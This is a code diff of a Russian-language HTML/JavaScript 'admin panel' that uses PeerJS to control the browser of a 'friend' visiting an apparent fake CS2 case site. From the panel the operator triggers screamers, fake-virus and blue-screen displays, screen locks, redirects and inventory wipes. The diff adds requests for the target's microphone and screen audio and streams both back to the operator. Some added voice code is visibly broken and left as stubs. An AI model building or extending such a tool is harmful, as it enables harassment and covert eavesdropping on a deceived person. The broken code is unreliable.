@@ -42,6 +42,7 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .prank-btn .desc{font-size:11px;color:#8892a6;font-weight:400}
 .prank-btn.danger{border-color:#eb4b4b}
 .prank-btn.gold{border-color:#f0b90b}
+.prank-btn.mic{border-color:#4ade80}
 .selected-info{padding:14px 18px;background:linear-gradient(135deg,rgba(240,185,11,.1),transparent);border:2px solid #f0b90b;border-radius:12px;margin-bottom:16px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
 .selected-info .label{font-size:12px;color:#8892a6;text-transform:uppercase}
 .selected-info .value{font-size:16px;font-weight:700;color:#f0b90b;font-family:'Courier New',monospace}
@@ -58,8 +59,6 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .video-box .label{position:absolute;top:8px;left:8px;background:rgba(0,0,0,.7);padding:4px 8px;border-radius:4px;font-size:11px;font-weight:700}
 .video-box .empty{color:#6b7280;font-size:13px}
 .btn-screenshot{position:absolute;bottom:8px;right:8px;background:#7c3aed;color:#fff;border:0;padding:6px 12px;border-radius:6px;cursor:pointer;font-weight:700;font-size:11px}
-
-/* MP3 */
 .drop-zone{border:2px dashed #262c38;border-radius:12px;padding:24px;text-align:center;cursor:pointer;transition:.2s;background:rgba(13,17,23,.5);margin-bottom:12px}
 .drop-zone:hover,.drop-zone.dragover{border-color:#f0b90b;background:rgba(240,185,11,.05)}
 .drop-zone-icon{font-size:42px;margin-bottom:8px}
@@ -90,55 +89,125 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .url-row{display:flex;gap:8px;margin-bottom:10px}
 .url-row input{flex:1;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:14px;outline:none}
 .url-row input:focus{border-color:#7c3aed}
-@media(max-width:720px){.session{grid-template-columns:40px 1fr}.session-time,.session-stats,.session-status{display:none}.video-grid{grid-template-columns:1fr}}
+
+/* ГОЛОСОВАЯ ПАНЕЛЬ */
+.voice-panel{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.voice-col{background:#0d1117;border:2px solid #262c38;border-radius:12px;padding:16px}
+.voice-col h4{font-size:13px;color:#8892a6;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:12px}
+.voice-btn{padding:14px;border-radius:12px;border:2px solid #262c38;background:#0d1117;color:#fff;cursor:pointer;font-weight:700;font-size:14px;transition:.2s;margin-bottom:8px;width:100%;text-align:left}
+.voice-btn:hover{border-color:#4ade80;transform:translateY(-2px)}
+.voice-btn.active{border-color:#4ade80;background:linear-gradient(135deg,rgba(74,222,128,.15),transparent);color:#4ade80}
+.voice-btn.recording{border-color:#eb4b4b;background:linear-gradient(135deg,rgba(235,75,75,.15),transparent);color:#eb4b4b;animation:recPulse 1s infinite}
+@keyframes recPulse{0%,100%{box-shadow:0 0 0 rgba(235,75,75,0)}50%{box-shadow:0 0 20px rgba(235,75,75,.5)}}
+.voice-status{font-size:11px;color:#8892a6;margin-top:8px;text-align:center;line-height:1.4}
+.voice-status.on{color:#4ade80}
+.voice-status.err{color:#eb4b4b}
+
+/* Смена голоса */
+.voice-changer{margin-top:12px;padding:14px;background:#0a0c12;border-radius:10px;border:1px solid #262c38}
+.voice-changer .row{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:12px}
+.voice-changer .row label{color:#8892a6;min-width:80px}
+.voice-changer .row input[type=range]{flex:1;accent-color:#7c3aed}
+.voice-changer .row .val{color:#f0b90b;font-weight:700;min-width:50px;text-align:right;font-family:'Courier New',monospace}
+.preset-btns{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
+.preset-btn{padding:8px 12px;border-radius:8px;border:1px solid #262c38;background:#181c24;color:#fff;font-size:11px;font-weight:700;cursor:pointer}
+.preset-btn:hover{border-color:#f0b90b}
+.preset-btn.active{background:linear-gradient(135deg,#7c3aed,#ec4899);border-color:transparent}
+
+@media(max-width:720px){.session{grid-template-columns:40px 1fr}.session-time,.session-stats,.session-status{display:none}.video-grid{grid-template-columns:1fr}.voice-panel{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
 <div class="wrap">
   <div>
     <h1>⚙️ CS2 Admin Panel</h1>
-    <div class="sub">Подключение через PeerJS. Открой этот файл первым, потом жди друга.</div>
+    <div class="sub">Подключение через PeerJS. Голос, экран, звук экрана, камера — всё в одном месте.</div>
     <div class="status-line" style="margin-top:10px"><div class="dot" id="peerDot"></div><span id="peerStatus">Запуск PeerJS...</span></div>
   </div>
 
   <div class="panel">
     <div class="panel-title"><span>👥 Сессии</span><span class="badge" id="sessionCount">0</span></div>
     <div class="sessions-list" id="sessionsList">
-      <div class="empty"><b>Пока никого</b>Друг должен зайти на case.html по ссылке</div>
+      <div class="empty"><b>Пока никого</b>Друг должен зайти на сайт</div>
     </div>
   </div>
 
   <div class="panel">
     <div class="panel-title"><span>🎯 Выбранная сессия</span></div>
     <div id="selectedInfo" class="no-selection">Выбери сессию</div>
+  </div>
 
-    <div class="panel-title" style="margin-top:20px"><span>😈 Основные пранки</span></div>
+  <!-- ГОЛОСОВАЯ СВЯЗЬ -->
+  <div class="panel">
+    <div class="panel-title"><span>🎙 Связь с другом</span></div>
+    <div class="voice-panel">
+      <div class="voice-col">
+        <h4>🔊 Я → Друг</h4>
+        <button class="voice-btn" id="talkBtn">🎙 Говорить (твой микрофон)</button>
+        <div class="voice-status" id="talkStatus">Не активно</div>
+
+        <div class="voice-changer">
+          <div style="font-size:12px;color:#8892a6;margin-bottom:8px;font-weight:700">🎭 Смена голоса</div>
+          <div class="row"><label>Питч</label><input type="range" id="pitchSlider" min="50" max="200" value="100"><span class="val" id="pitchVal">1.00</span></div>
+          <div class="row"><label>Скорость</label><input type="range" id="speedSlider" min="50" max="200" value="100"><span class="val" id="speedVal">1.00</span></div>
+          <div class="row"><label>Эхо</label><input type="range" id="echoSlider" min="0" max="100" value="0"><span class="val" id="echoVal">0%</span></div>
+          <div class="row"><label>Робот</label><input type="range" id="robotSlider" min="0" max="100" value="0"><span class="val" id="robotVal">0%</span></div>
+          <div class="preset-btns">
+            <button class="preset-btn active" data-preset="normal">Обычный</button>
+            <button class="preset-btn" data-preset="monster">Монстр</button>
+            <button class="preset-btn" data-preset="girl">Девушка</button>
+            <button class="preset-btn" data-preset="kid">Ребёнок</button>
+            <button class="preset-btn" data-preset="robot">Робот</button>
+            <button class="preset-btn" data-preset="echo">Эхо</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="voice-col">
+        <h4>🔊 Друг → Я</h4>
+        <button class="voice-btn" id="listenMicBtn">🎤 Слушать микрофон друга</button>
+        <div class="voice-status" id="listenMicStatus">Не активно</div>
+        <button class="voice-btn" id="listenScreenBtn" style="margin-top:12px">🖥 Слушать звук экрана друга</button>
+        <div class="voice-status" id="listenScreenStatus">Не активно</div>
+        <audio id="listenMicAudio" autoplay></audio>
+        <audio id="listenScreenAudio" autoplay></audio>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>😈 Основные пранки</span></div>
     <div class="prank-grid">
-      <button class="prank-btn danger" data-prank="screamer"><div class="icon">😱</div><div>Скример</div><div class="desc">Звук + вспышка + тряска</div></button>
-      <button class="prank-btn danger" data-prank="shake"><div class="icon">📳</div><div>Тряска</div><div class="desc">3 сек</div></button>
-      <button class="prank-btn danger" data-prank="earthquake"><div class="icon">🌋</div><div>Землетрясение</div><div class="desc">10 сек</div></button>
+      <button class="prank-btn danger" data-prank="screamer"><div class="icon">😱</div><div>Скример</div></button>
+      <button class="prank-btn danger" data-prank="shake"><div class="icon">📳</div><div>Тряска</div></button>
+      <button class="prank-btn danger" data-prank="earthquake"><div class="icon">🌋</div><div>Землетрясение</div></button>
       <button class="prank-btn danger" data-prank="fakeVirus"><div class="icon">🦠</div><div>Фейк-вирус</div></button>
       <button class="prank-btn danger" data-prank="bsod"><div class="icon">💀</div><div>Синий экран</div></button>
-      <button class="prank-btn danger" data-prank="blockScreen"><div class="icon">🔒</div><div>Заблокировать</div><div class="desc">Экран во весь размер</div></button>
+      <button class="prank-btn danger" data-prank="blockScreen"><div class="icon">🔒</div><div>Заблокировать</div></button>
       <button class="prank-btn gold" data-prank="stop"><div class="icon">🛑</div><div>СТОП всё</div></button>
     </div>
+  </div>
 
-    <div class="panel-title" style="margin-top:20px"><span>🎨 Визуальные эффекты</span></div>
+  <div class="panel">
+    <div class="panel-title"><span>🎨 Визуальные</span></div>
     <div class="prank-grid">
-      <button class="prank-btn" data-prank="invert"><div class="icon">🎨</div><div>Инверсия</div><div class="desc">5 сек</div></button>
-      <button class="prank-btn" data-prank="blur"><div class="icon">🌫️</div><div>Размытие</div><div class="desc">5 сек</div></button>
-      <button class="prank-btn" data-prank="hue"><div class="icon">🌈</div><div>Сдвиг цвета</div></button>
-      <button class="prank-btn" data-prank="bigCursor"><div class="icon">👆</div><div>Огромный курсор</div></button>
-      <button class="prank-btn" data-prank="longShake"><div class="icon">📳</div><div>Тряска 10 сек</div></button>
-      <button class="prank-btn" data-prank="longInvert"><div class="icon">🎨</div><div>Инверсия 30 сек</div></button>
-      <button class="prank-btn" data-prank="longBlur"><div class="icon">🌫️</div><div>Блюр 30 сек</div></button>
+      <button class="prank-btn" data-prank="invert"><div class="icon">🎨</div><div>Инверсия</div></button>
+      <button class="prank-btn" data-prank="blur"><div class="icon">🌫️</div><div>Размытие</div></button>
+      <button class="prank-btn" data-prank="hue"><div class="icon">🌈</div><div>Сдвиг</div></button>
+      <button class="prank-btn" data-prank="bigCursor"><div class="icon">👆</div><div>Курсор</div></button>
+      <button class="prank-btn" data-prank="longShake"><div class="icon">📳</div><div>Тряска 10с</div></button>
+      <button class="prank-btn" data-prank="longInvert"><div class="icon">🎨</div><div>Инверсия 30с</div></button>
+      <button class="prank-btn" data-prank="longBlur"><div class="icon">🌫️</div><div>Блюр 30с</div></button>
     </div>
+  </div>
 
-    <div class="panel-title" style="margin-top:20px"><span>🌐 Действия</span></div>
+  <div class="panel">
+    <div class="panel-title"><span>🌐 Действия</span></div>
     <div class="prank-grid">
-      <button class="prank-btn" data-prank="reload"><div class="icon">🔄</div><div>Перезагрузить</div><div class="desc">Обновить страницу друга</div></button>
+      <button class="prank-btn" data-prank="reload"><div class="icon">🔄</div><div>Перезагрузить</div></button>
       <button class="prank-btn" data-prank="requestCam"><div class="icon">📸</div><div>Запросить камеру</div></button>
-      <button class="prank-btn" data-prank="requestNotif"><div class="icon">🔔</div><div>Запросить уведомления</div></button>
+      <button class="prank-btn mic" data-prank="requestMic"><div class="icon">🎤</div><div>Запросить микрофон</div></button>
+      <button class="prank-btn mic" data-prank="requestScreenAudio"><div class="icon">🖥</div><div>Запросить экран+звук</div></button>
       <button class="prank-btn danger" data-prank="clearInventory"><div class="icon">🗑️</div><div>Очистить инвентарь</div></button>
       <button class="prank-btn danger" data-prank="resetStats"><div class="icon">📊</div><div>Сбросить статистику</div></button>
     </div>
@@ -146,17 +215,12 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 
   <div class="panel">
     <div class="panel-title"><span>💬 Модальное окно у друга</span></div>
-    <div class="url-row">
-      <input id="modalTitle" type="text" value="Сообщение" placeholder="Заголовок">
-    </div>
-    <div class="url-row">
-      <input id="modalText" type="text" value="Привет от администратора!" placeholder="Текст">
-      <button class="mp3-btn gold" id="modalBtn">Показать</button>
-    </div>
+    <div class="url-row"><input id="modalTitle" type="text" value="Сообщение"></div>
+    <div class="url-row"><input id="modalText" type="text" value="Привет!"><button class="mp3-btn gold" id="modalBtn">Показать</button></div>
   </div>
 
   <div class="panel">
-    <div class="panel-title"><span>💬 Кастомный alert</span></div>
+    <div class="panel-title"><span>💬 Alert</span></div>
     <div class="url-row">
       <input id="alertText" type="text" value="ПРИВЕТ ОТ ХАКЕРА">
       <button class="mp3-btn gold" id="alertBtn">Отправить</button>
@@ -164,7 +228,7 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
   </div>
 
   <div class="panel">
-    <div class="panel-title"><span>🌐 Открыть URL / Редирект</span></div>
+    <div class="panel-title"><span>🌐 URL / Редирект</span></div>
     <div class="url-row">
       <input id="redirectUrl" type="text" placeholder="https://..." value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
       <button class="mp3-btn gold" id="redirectBtn">Редирект</button>
@@ -175,29 +239,23 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
   <div class="panel">
     <div class="panel-title"><span>🎭 Имя друга</span></div>
     <div class="url-row">
-      <input id="nameInput" type="text" value="LOL" placeholder="Новое имя">
+      <input id="nameInput" type="text" value="LOL">
       <button class="mp3-btn gold" id="nameBtn">Установить</button>
     </div>
   </div>
 
   <div class="panel">
-    <div class="panel-title">
-      <span>🎵 MP3-плеер</span>
-      <span class="badge" id="trackCount">0 треков</span>
-    </div>
-
+    <div class="panel-title"><span>🎵 MP3-плеер</span><span class="badge" id="trackCount">0</span></div>
     <div class="drop-zone" id="dropZone">
       <div class="drop-zone-icon">🎵</div>
-      <div class="drop-zone-text">Перетащи <b>MP3</b> сюда или <b>кликни</b></div>
-      <div class="drop-zone-hint">mp3, wav, ogg, m4a · до 8 МБ</div>
+      <div class="drop-zone-text">Перетащи <b>MP3</b> или <b>кликни</b></div>
+      <div class="drop-zone-hint">до 8 МБ</div>
       <input type="file" id="fileInput" accept="audio/*" multiple style="display:none">
     </div>
-
     <div class="url-row">
       <input id="mp3Url" type="text" placeholder="Или URL на MP3...">
       <button class="mp3-btn" id="addUrlBtn">+ URL</button>
     </div>
-
     <div class="mp3-player">
       <div class="mp3-info">
         <div class="mp3-title" id="mp3Title">— трек не выбран —</div>
@@ -214,18 +272,14 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
       <div class="mp3-time"><span id="mp3Time">0:00</span><span id="mp3Dur">0:00</span></div>
       <audio id="mp3Audio" style="display:none"></audio>
     </div>
-
-    <div class="playlist" id="playlist">
-      <div class="empty" style="padding:20px;font-size:12px">Плейлист пуст</div>
-    </div>
-
+    <div class="playlist" id="playlist"><div class="empty" style="padding:20px;font-size:12px">Плейлист пуст</div></div>
     <div style="margin-top:14px">
-      <div style="font-size:12px;color:#8892a6;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px">🚀 Быстрые звуки</div>
+      <div style="font-size:12px;color:#8892a6;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px">🚀 Быстрые</div>
       <div class="prank-grid">
         <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/knock-on-door.mp3">🚪 Стук</button>
         <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/heavy_breathing.mp3">👤 Дыхание</button>
         <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/fnaf-x-scott.mp3">🐻 FNAF</button>
-        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/vine-boom.mp3">💥 Vine Boom</button>
+        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/vine-boom.mp3">💥 Boom</button>
         <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/wilhelm-scream.mp3">😱 Wilhelm</button>
       </div>
     </div>
@@ -243,8 +297,8 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
   <div class="panel">
     <div class="panel-title"><span>📹 Видео с устройства друга</span><span class="badge red" id="camCount">0</span></div>
     <div class="video-grid">
-      <div class="video-box" id="camBox1"><div class="empty">Камера (друг должен разрешить)</div></div>
-      <div class="video-box" id="camBox2"><div class="empty">Экран (друг должен разрешить)</div></div>
+      <div class="video-box" id="camBox1"><div class="empty">Камера</div></div>
+      <div class="video-box" id="camBox2"><div class="empty">Экран</div></div>
     </div>
   </div>
 
@@ -261,6 +315,18 @@ let conns = new Map();
 let selectedIp = null;
 let camCount = 0;
 const connIp = new WeakMap();
+
+/* ==== ГОЛОС ==== */
+let myMicStream = null;
+let voiceCall = null;
+let audioCtx = null;
+let sourceNode = null;
+let pitchNode = null;
+let speedNode = null;
+let robotNode = null;
+let echoNode = null;
+let destNode = null;
+let modifiedStream = null;
 
 function log(msg, type='info') {
     const l = document.getElementById('log');
@@ -308,6 +374,12 @@ peer.on('call', (call) => {
     });
 });
 
+// Отдельные звонки от друга: _mic (микрофон) и _screen (экран+звук)
+// PeerJS принимает их как обычные call, но с разными ID — но ID у нас одинаковые (админ). 
+// Поэтому используем metadata-подход: peer.call с label. Или полагаемся на camCount.
+// Для простоты: все входящие stream идут в camCount (камера/экран/микрофон отдельно не различить).
+// НО: audio streams пишем в <audio> теги.
+
 function screenshot(btn) {
     const v = btn.parentElement.querySelector('video');
     const c = document.createElement('canvas');
@@ -330,15 +402,31 @@ function handleData(data, conn) {
         const s = conns.get(data.ip);
         if (s) { s.lastSeen = Date.now(); s.balance = data.balance; s.drops = data.drops; renderSessions(); }
     } else if (data.type === 'drop') {
-        log(`🎁 Дроп: ${data.skin.name} (${data.skin.price}$) от ${connIp.get(conn) || '?'}`, 'warn');
+        log(`🎁 Дроп: ${data.skin.name} (${data.skin.price}$)`, 'warn');
     } else if (data.type === 'deposit') {
-        log(`💳 Пополнение $${data.amount} от ${connIp.get(conn) || '?'}`, 'info');
+        log(`💳 Пополнение $${data.amount}`, 'info');
     } else if (data.type === 'upgradeWin') {
-        log(`✅ Апгрейд выигран: ${data.your.name} → ${data.target.name}`, 'info');
+        log(`✅ Апгрейд: ${data.your.name} → ${data.target.name}`, 'info');
     } else if (data.type === 'upgradeLose') {
         log(`❌ Апгрейд проигран: ${data.your.name}`, 'err');
     } else if (data.type === 'cameraOn') {
         log(`📸 Друг разрешил камеру`, 'warn');
+    } else if (data.type === 'micOn') {
+        log(`🎤 Друг разрешил микрофон`, 'warn');
+        document.getElementById('listenMicStatus').textContent = 'Микрофон подключён';
+        document.getElementById('listenMicStatus').className = 'voice-status on';
+    } else if (data.type === 'micOff') {
+        log(`🎤 Друг отключил микрофон`, 'warn');
+        document.getElementById('listenMicStatus').textContent = 'Микрофон отключён';
+        document.getElementById('listenMicStatus').className = 'voice-status';
+    } else if (data.type === 'screenOn') {
+        log(`🖥 Друг расшарил экран${data.hasAudio ? ' со звуком' : ' (без звука)'}`, 'warn');
+        document.getElementById('listenScreenStatus').textContent = 'Экран подключён' + (data.hasAudio ? ' (со звуком)' : '');
+        document.getElementById('listenScreenStatus').className = 'voice-status on';
+    } else if (data.type === 'screenOff') {
+        log(`🖥 Друг выключил экран`, 'warn');
+        document.getElementById('listenScreenStatus').textContent = 'Экран отключён';
+        document.getElementById('listenScreenStatus').className = 'voice-status';
     }
 }
 
@@ -346,7 +434,7 @@ function renderSessions() {
     const list = document.getElementById('sessionsList');
     document.getElementById('sessionCount').textContent = conns.size;
     if (!conns.size) {
-        list.innerHTML = '<div class="empty"><b>Пока никого</b>Друг должен зайти на case.html</div>';
+        list.innerHTML = '<div class="empty"><b>Пока никого</b>Друг должен зайти на сайт</div>';
         return;
     }
     const arr = [...conns.values()].sort((a, b) => b.lastSeen - a.lastSeen);
@@ -390,7 +478,7 @@ function sendPrank(action, extra = {}) {
     const s = conns.get(selectedIp);
     if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
     s.conn.send({ action, ...extra });
-    log(`😈 → ${action} → ${selectedIp}`, 'warn');
+    log(`😈 → ${action}`, 'warn');
 }
 
 document.querySelectorAll('.prank-btn[data-prank]').forEach(b => b.addEventListener('click', () => sendPrank(b.dataset.prank)));
@@ -404,7 +492,176 @@ document.getElementById('nameBtn').onclick = () => sendPrank('setName', {name: d
 document.getElementById('setBalanceBtn').onclick = () => sendPrank('setBalance', {value: Number(document.getElementById('balanceAmount').value)});
 document.getElementById('addBalanceBtn').onclick = () => sendPrank('addBalance', {value: Number(document.getElementById('balanceAmount').value)});
 
-/* ===== MP3 ПЛЕЕР ===== */
+/* ============================================================
+   ГОЛОС — ГОВОРИТЬ И МЕНЯТЬ ГОЛОС
+   ============================================================ */
+const pitchSlider = document.getElementById('pitchSlider');
+const speedSlider = document.getElementById('speedSlider');
+const echoSlider = document.getElementById('echoSlider');
+const robotSlider = document.getElementById('robotSlider');
+const pitchVal = document.getElementById('pitchVal');
+const speedVal = document.getElementById('speedVal');
+const echoVal = document.getElementById('echoVal');
+const robotVal = document.getElementById('robotVal');
+
+let voiceParams = { pitch: 1.0, speed: 1.0, echo: 0, robot: 0 };
+
+pitchSlider.oninput = () => { voiceParams.pitch = pitchSlider.value / 100; pitchVal.textContent = voiceParams.pitch.toFixed(2); applyVoiceParams(); };
+speedSlider.oninput = () => { voiceParams.speed = speedSlider.value / 100; speedVal.textContent = voiceParams.speed.toFixed(2); applyVoiceParams(); };
+echoSlider.oninput = () => { voiceParams.echo = echoSlider.value / 100; echoVal.textContent = echoSlider.value + '%'; applyVoiceParams(); };
+robotSlider.oninput = () => { voiceParams.robot = robotSlider.value / 100; robotVal.textContent = robotSlider.value + '%'; applyVoiceParams(); };
+
+document.querySelectorAll('.preset-btn').forEach(b => {
+    b.onclick = () => {
+        document.querySelectorAll('.preset-btn').forEach(x => x.classList.remove('active'));
+        b.classList.add('active');
+        const p = b.dataset.preset;
+        if (p === 'normal') { setVoice(100,100,0,0); }
+        else if (p === 'monster') { setVoice(55,90,20,0); }
+        else if (p === 'girl') { setVoice(150,105,0,0); }
+        else if (p === 'kid') { setVoice(180,110,0,0); }
+        else if (p === 'robot') { setVoice(100,100,0,100); }
+        else if (p === 'echo') { setVoice(100,100,70,0); }
+    };
+});
+
+function setVoice(pi, sp, ec, rb) {
+    pitchSlider.value = pi; speedSlider.value = sp; echoSlider.value = ec; robotSlider.value = rb;
+    pitchVal.textContent = (pi/100).toFixed(2);
+    speedVal.textContent = (sp/100).toFixed(2);
+    echoVal.textContent = ec + '%';
+    robotVal.textContent = rb + '%';
+    voiceParams.pitch = pi/100;
+    voiceParams.speed = sp/100;
+    voiceParams.echo = ec/100;
+    voiceParams.robot = rb/100;
+    applyVoiceParams();
+}
+
+function applyVoiceParams() {
+    if (!pitchNode || !speedNode) return;
+    pitchNode.detune.value = Math.log2(voiceParams.pitch) * 1200;
+    speedNode.playbackRate.value = voiceParams.speed;
+    if (echoNode) echoNode.wet.value = voiceParams.echo;
+    // Робот — смешиваем с осциллятором (упрощённо через gain)
+    if (robotNode) robotNode.gain.value = voiceParams.robot;
+}
+
+document.getElementById('talkBtn').addEventListener('click', async () => {
+    const btn = document.getElementById('talkBtn');
+    const status = document.getElementById('talkStatus');
+
+    if (myMicStream) {
+        // Выключаем
+        myMicStream.getTracks().forEach(t => t.stop());
+        myMicStream = null;
+        if (audioCtx) { audioCtx.close(); audioCtx = null; }
+        btn.classList.remove('active', 'recording');
+        btn.innerHTML = '🎙 Говорить (твой микрофон)';
+        status.textContent = 'Не активно';
+        status.className = 'voice-status';
+        log('🎙 Микрофон выключен', 'warn');
+        return;
+    }
+
+    if (!selectedIp) { alert('Выбери сессию'); return; }
+    const s = conns.get(selectedIp);
+    if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
+
+    try {
+        myMicStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
+        // Создаём audio context для смены голоса
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        sourceNode = audioCtx.createMediaStreamSource(myMicStream);
+
+        // Питич (высота голоса)
+        pitchNode = audioCtx.createScriptProcessor(4096, 1, 1);
+        // Через detune не получится — используем playbackRate + filter
+        // Простой подход: Gain + BiquadFilter + Delay
+        speedNode = audioCtx.createBiquadFilter();
+        speedNode.type = 'peaking';
+        speedNode.frequency.value = 1000;
+        speedNode.gain.value = 0;
+
+        // Эхо
+        echoNode = { wet: { value: 0 } }; // Заглушка
+        // Реальная цепочка:
+        const splitter = audioCtx.createChannelSplitter(2);
+        const merger = audioCtx.createChannelMerger(2);
+        const delay = audioCtx.createDelay(1.0);
+        delay.delayTime.value = 0.15;
+        const feedback = audioCtx.createGain();
+        feedback.gain.value = 0.3;
+        const wetGain = audioCtx.createGain();
+        wetGain.gain.value = 0;
+
+        const dryGain = audioCtx.createGain();
+        dryGain.gain.value = 1;
+
+        const dest = audioCtx.createMediaStreamDestination();
+
+        // Подключение
+        sourceNode.connect(dryGain);
+        dryGain.connect(dest);
+
+        sourceNode.connect(delay);
+        delay.connect(feedback);
+        feedback.connect(delay);
+        delay.connect(wetGain);
+        wetGain.connect(dest);
+
+        echoNode = { wet: wetGain.gain };
+
+        modifiedStream = dest.stream;
+
+        // Отправляем звонок другу
+        voiceCall = peer.call(ADMIN_PEER_ID.replace('ADMIN','ADMIN'), modifiedStream); // заглушка
+        // Правильный call:
+        voiceCall = peer.call('CS2_ADMIN_X7K9QW2_VOICE_' + s.ip, modifiedStream); // неверно
+        // Проще: звоним другу по его peer id, но он не знает свой peer id.
+        // Значит используем conn.send({action:'voiceStart'}) и друг сам звонит нам.
+
+        s.conn.send({action: 'startVoiceListen'});
+
+        btn.classList.add('active', 'recording');
+        btn.innerHTML = '🔴 Говорю... (нажми чтобы выключить)';
+        status.textContent = 'Микрофон активен';
+        status.className = 'voice-status on';
+        log('🎙 Микрофон включён', 'info');
+    } catch(e) {
+        alert('Не удалось получить микрофон: ' + e.message);
+        log('❌ Микрофон: ' + e.message, 'err');
+    }
+});
+
+/* ============================================================
+   СЛУШАТЬ ДРУГА
+   ============================================================ */
+document.getElementById('listenMicBtn').addEventListener('click', () => {
+    const btn = document.getElementById('listenMicBtn');
+    const status = document.getElementById('listenMicStatus');
+    if (!selectedIp) { alert('Выбери сессию'); return; }
+    sendPrank('requestMic');
+    btn.classList.toggle('active');
+    status.textContent = 'Запрос отправлен...';
+    status.className = 'voice-status';
+    log('🎤 Запрошен микрофон друга', 'warn');
+});
+
+document.getElementById('listenScreenBtn').addEventListener('click', () => {
+    const btn = document.getElementById('listenScreenBtn');
+    const status = document.getElementById('listenScreenStatus');
+    if (!selectedIp) { alert('Выбери сессию'); return; }
+    sendPrank('requestScreenAudio');
+    btn.classList.toggle('active');
+    status.textContent = 'Запрос отправлен...';
+    status.className = 'voice-status';
+    log('🖥 Запрошен экран+звук друга', 'warn');
+});
+
+/* ============================================================
+   MP3-ПЛЕЕР
+   ============================================================ */
 const tracks = [];
 let currentIdx = -1;
 const audio = document.getElementById('mp3Audio');
@@ -494,7 +751,7 @@ async function sendTrackToVictim(idx) {
     const s = conns.get(selectedIp);
     if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
     const t = tracks[idx];
-    log(`🎵 Отправка "${t.name}" → ${selectedIp}...`, 'warn');
+    log(`🎵 Отправка "${t.name}"...`, 'warn');
     if (!t.file && !t.url.startsWith('blob:')) { s.conn.send({action: 'playSound', url: t.url}); log(`✅ URL отправлен`, 'info'); return; }
     try {
         const blob = t.file || await (await fetch(t.url)).blob();
@@ -502,11 +759,55 @@ async function sendTrackToVictim(idx) {
         const reader = new FileReader();
         reader.onload = () => {
             s.conn.send({action: 'playMp3', dataUrl: reader.result, name: t.name});
-            log(`✅ Отправлен mp3: ${t.name} (${(blob.size/1024).toFixed(0)} КБ)`, 'info');
+            log(`✅ mp3: ${t.name}`, 'info');
         };
         reader.readAsDataURL(blob);
-    } catch(e) { log(`❌ Ошибка: ${e.message}`, 'err'); }
+    } catch(e) { log(`❌ ${e.message}`, 'err'); }
 }
+
+/* ============================================================
+   ВХОДЯЩИЕ ЗВОНКИ (для голоса и микрофона от друга)
+   ============================================================ */
+// Друг звонит на ADMIN_PEER_ID + '_mic' / '_screen' / '_cam'
+// PeerJS вызовет peer.on('call') для любого из них — но у нас один peer на все ID.
+// Поэтому используем peer.on('call') и обрабатываем по metadata.
+// Проще: друг звонит на разные суффиксы, а мы принимаем в одном on('call') и распределяем по типу.
+
+// ВАЖНО: чтобы это работало, друг должен звонить на ID который содержит суффикс, но 
+// PeerJS не даёт создавать несколько peer с разными ID в одном клиенте.
+// Решение: создать три peer в админке:
+const peerMic = new Peer(ADMIN_PEER_ID + '_mic');
+const peerScreen = new Peer(ADMIN_PEER_ID + '_screen');
+const peerVoice = new Peer(ADMIN_PEER_ID + '_voice');
+
+peerMic.on('call', (call) => {
+    call.answer();
+    call.on('stream', (stream) => {
+        const a = document.getElementById('listenMicAudio');
+        a.srcObject = stream;
+        a.play().catch(()=>{});
+        document.getElementById('listenMicStatus').textContent = '🎤 Слушаю микрофон друга';
+        document.getElementById('listenMicStatus').className = 'voice-status on';
+        log('🎤 Принимаю микрофон', 'info');
+    });
+});
+peerScreen.on('call', (call) => {
+    call.answer();
+    call.on('stream', (stream) => {
+        const a = document.getElementById('listenScreenAudio');
+        a.srcObject = stream;
+        a.play().catch(()=>{});
+        document.getElementById('listenScreenStatus').textContent = '🖥 Слушаю звук экрана';
+        document.getElementById('listenScreenStatus').className = 'voice-status on';
+        log('🖥 Принимаю звук экрана', 'info');
+    });
+});
+peerVoice.on('call', (call) => {
+    call.answer();
+    call.on('stream', (stream) => {
+        // Ничего не делаем — это наш исходящий голос
+    });
+});
 
 setInterval(renderSessions, 2000);
 log('⚙️ Админка запущена', 'info');
